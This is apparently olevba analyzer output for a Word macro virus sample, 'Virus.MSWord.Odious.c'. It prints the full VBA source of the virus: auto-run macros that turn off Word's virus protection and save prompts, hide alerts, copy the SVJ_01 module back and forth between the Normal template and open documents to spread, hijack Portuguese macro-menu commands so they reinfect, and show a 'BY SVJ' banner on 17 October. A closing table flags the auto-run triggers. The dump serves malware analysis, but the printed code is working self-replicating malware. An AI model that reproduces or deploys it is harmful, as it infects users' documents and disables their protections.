olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Odious.c-aae0afb5c670cf2dc22f72c1de5264bbabc5acee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Odious.c-aae0afb5c670cf2dc22f72c1de5264bbabc5acee - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SVJ_01.bas 
in file: Virus.MSWord.Odious.c-aae0afb5c670cf2dc22f72c1de5264bbabc5acee - OLE stream: 'Macros/VBA/SVJ_01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Application.DefaultSaveFormat = ""
End Sub
Sub AutoOpen()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub AutoNew()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub AutoClose()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Function Virus()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Application.DisplayAlerts = wdAlertsNone
    E
    If Day(Date) = 17 And Month(Date) = 10 And Hour(Time) = 11 Then
        TextoSVJ
    End If
End Function
Function E()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Dim A, B As String
    A = Application.NormalTemplate.FullName
    B = Application.ActiveDocument.FullName
    Application.OrganizerCopy A, B, "SVJ_01", wdOrganizerObjectProjectItems
    Application.OrganizerCopy B, A, "SVJ_01", wdOrganizerObjectProjectItems
End Function
Sub ExibirCódigoVB()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub FerramGravarMacroAlternar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub ExibirCódigo()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub FerramMacro()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub InterromperGravação()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub FerramentasGravarMacroIniciar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub FerramentasGravarMacroParar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
End Sub
Sub ArquivoModelos()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Virus
End Sub
Sub ArquivoSalvar()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    E
    ActiveDocument.Save
End Sub
Function TextoSVJ()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    ActiveWindow.ActivePane.View.ShowAll = False
    If ActiveWindow.View.SplitSpecial = wdPaneNone Then
        ActiveWindow.ActivePane.View.Type = wdPageView
    Else
        ActiveWindow.View.Type = wdPageView
    End If
    Selection.ParagraphFormat.LineSpacingRule = wdLineSpaceSingle
    Selection.TypeParagraph
    Selection.MoveUp Unit:=wdLine, Count:=1
    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
    With Selection.Font
        .Name = "Times New Roman"
        .Size = 80
        .Bold = True
        .Italic = False
        .Underline = wdUnderlineWavy
        .StrikeThrough = False
        .DoubleStrikeThrough = False
        .Outline = False
        .Emboss = False
        .Shadow = True
        .Hidden = False
        .SmallCaps = False
        .AllCaps = False
        .ColorIndex = wdDarkBlue
        .Engrave = False
        .Superscript = False
        .Subscript = False
        .Spacing = 0
        .Scaling = 100
        .Position = 0
        .Kerning = 0
        .Animation = wdAnimationShimmer
    End With
    Selection.TypeText Text:="BY  SVJ"
    With Selection.Font
        .Name = "Times New Roman"
        .Size = 80
        .Bold = True
        .Italic = False
        .Underline = wdUnderlineWavy
        .StrikeThrough = False
        .DoubleStrikeThrough = False
        .Outline = False
        .Emboss = False
        .Shadow = True
        .Hidden = False
        .SmallCaps = False
        .AllCaps = False
        .ColorIndex = wdDarkBlue
        .Engrave = False
        .Superscript = True
        .Subscript = False
        .Spacing = 0
        .Scaling = 100
        .Position = 0
        .Kerning = 0
        .Animation = wdAnimationShimmer
    End With
    Selection.InsertSymbol Font:="Symbol", CharacterNumber:=-3870, Unicode:= _
        True
    With Selection.ParagraphFormat
        With .Borders(wdBorderLeft)
            .LineStyle = wdLineStyleThinThickSmallGap
            .LineWidth = wdLineWidth450pt
            .ColorIndex = wdBlue
        End With
        With .Borders(wdBorderRight)
            .LineStyle = wdLineStyleThickThinSmallGap
            .LineWidth = wdLineWidth450pt
            .ColorIndex = wdBlue
        End With
        With .Borders(wdBorderTop)
            .LineStyle = wdLineStyleThinThickSmallGap
            .LineWidth = wdLineWidth450pt
            .ColorIndex = wdBlue
        End With
        With .Borders(wdBorderBottom)
            .LineStyle = wdLineStyleThickThinSmallGap
            .LineWidth = wdLineWidth450pt
            .ColorIndex = wdBlue
        End With
        With .Borders
            .DistanceFromTop = 1
            .DistanceFromLeft = 4
            .DistanceFromBottom = 1
            .DistanceFromRight = 4
            .Shadow = False
        End With
    End With
    With Options
        .DefaultBorderLineStyle = wdLineStyleThinThickSmallGap
        .DefaultBorderLineWidth = wdLineWidth450pt
        .DefaultBorderColorIndex = wdBlue
    End With
    Selection.MoveDown Unit:=wdLine, Count:=1
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
+----------+--------------------+---------------------------------------------+

